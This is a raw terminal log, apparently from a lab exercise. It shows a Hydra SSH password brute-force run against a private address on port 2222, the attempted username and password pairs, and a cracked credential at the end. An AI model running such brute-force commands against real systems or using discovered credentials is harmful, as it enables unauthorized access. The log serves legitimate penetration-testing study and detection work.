┌──(xendi㉿shadow)-[~]
└─$ hydra -L users.txt.1 -P passwords.txt.1 -s 2222 -V ssh://192.168.9.6
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-04 11:33:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:3/p:7), ~2 tries per task
[DATA] attacking ssh://192.168.9.6:2222/
[ATTEMPT] target 192.168.9.6 - login "testuser" - pass "123456" - 1 of 21 [child 0] (0/0)
[ATTEMPT] target 192.168.9.6 - login "testuser" - pass "password" - 2 of 21 [child 1] (0/0)
[ATTEMPT] target 192.168.9.6 - login "testuser" - pass "admin" - 3 of 21 [child 2] (0/0)
[ATTEMPT] target 192.168.9.6 - login "testuser" - pass "password123" - 4 of 21 [child 3] (0/0)
[ATTEMPT] target 192.168.9.6 - login "testuser" - pass "qwerty" - 5 of 21 [child 4] (0/0)
[ATTEMPT] target 192.168.9.6 - login "testuser" - pass "letmein" - 6 of 21 [child 5] (0/0)
[ATTEMPT] target 192.168.9.6 - login "testuser" - pass "supnum" - 7 of 21 [child 6] (0/0)
[ATTEMPT] target 192.168.9.6 - login "admin" - pass "123456" - 8 of 21 [child 7] (0/0)
[ATTEMPT] target 192.168.9.6 - login "admin" - pass "password" - 9 of 21 [child 8] (0/0)
[ATTEMPT] target 192.168.9.6 - login "admin" - pass "admin" - 10 of 21 [child 9] (0/0)
[ATTEMPT] target 192.168.9.6 - login "admin" - pass "password123" - 11 of 21 [child 10] (0/0)
[ATTEMPT] target 192.168.9.6 - login "admin" - pass "qwerty" - 12 of 21 [child 11] (0/0)
[ATTEMPT] target 192.168.9.6 - login "admin" - pass "letmein" - 13 of 21 [child 12] (0/0)
[ATTEMPT] target 192.168.9.6 - login "admin" - pass "supnum" - 14 of 21 [child 13] (0/0)
[ATTEMPT] target 192.168.9.6 - login "rss" - pass "123456" - 15 of 21 [child 14] (0/0)
[ATTEMPT] target 192.168.9.6 - login "rss" - pass "password" - 16 of 21 [child 15] (0/0)
[ATTEMPT] target 192.168.9.6 - login "rss" - pass "admin" - 17 of 25 [child 7] (0/4)
[ATTEMPT] target 192.168.9.6 - login "rss" - pass "password123" - 18 of 25 [child 9] (0/4)
[ATTEMPT] target 192.168.9.6 - login "rss" - pass "qwerty" - 19 of 25 [child 10] (0/4)
[ATTEMPT] target 192.168.9.6 - login "rss" - pass "letmein" - 20 of 25 [child 0] (0/4)
[ATTEMPT] target 192.168.9.6 - login "rss" - pass "supnum" - 21 of 25 [child 1] (0/4)
[REDO-ATTEMPT] target 192.168.9.6 - login "admin" - pass "qwerty" - 22 of 25 [child 6] (1/4)
[REDO-ATTEMPT] target 192.168.9.6 - login "rss" - pass "password" - 23 of 25 [child 12] (2/4)
[REDO-ATTEMPT] target 192.168.9.6 - login "testuser" - pass "qwerty" - 24 of 25 [child 3] (3/4)
[REDO-ATTEMPT] target 192.168.9.6 - login "admin" - pass "password" - 25 of 25 [child 3] (4/4)
[2222][ssh] host: 192.168.9.6   login: rss   password: supnum
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-04 11:34:21
                                                                                                                                                                        
┌──(xendi㉿shadow)-[~]
└─$ 
